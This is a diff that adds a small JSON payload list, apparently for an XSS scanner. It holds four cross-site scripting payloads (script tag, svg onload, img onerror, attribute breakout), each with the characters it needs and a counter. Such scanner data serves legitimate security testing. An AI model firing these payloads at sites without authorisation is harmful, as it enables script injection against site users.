@@ -1,0 +1,18 @@
+[
+  {"Payload": "\" onmouseover=alert(1)",
+    "Attributes":["\""],
+    "count": 0
+  },
+  {"Payload": "><script>alert(1)</script>",
+    "Attributes": ["<",">","/","'","\""],
+    "count": 0
+  },
+  {"Payload": "<svg/onload=alert(1)>",
+    "Attributes": ["<",">","/","'","\""],
+    "count": 0
+  },
+  {"Payload": "<img src=x onerror=alert(1)>",
+    "Attributes":[">","<"],
+    "count": 0
+  }
+]
